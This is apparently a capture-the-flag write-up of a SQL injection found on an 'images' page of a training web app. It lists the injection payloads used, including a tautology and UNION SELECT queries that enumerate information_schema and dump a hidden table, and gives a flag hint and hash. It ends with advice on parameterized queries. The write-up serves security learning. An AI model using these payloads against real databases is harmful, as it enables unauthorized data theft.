# SQL Injection

## Location

```
http://ip/?page=images
```
## Breach
in the input we tried the value 1 or 1=1  to check if there is an sql injection possibiltie and we got the table dumped,
so we tried to look more into it by getting some database information using the next query
```
1337 or 1=1 UNION select table_name, column_name FROM information_schema.columns
```
after multiple queries combinations with the next query we succeeded to get some useful dinstructions to get our flag
```
1337 or 1=1 union select comment, title FROM list_images
```
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

## Solution

the best approach is controlling and vetting user input to watch for attack patterns. 
use Parametrized queries or an database orm.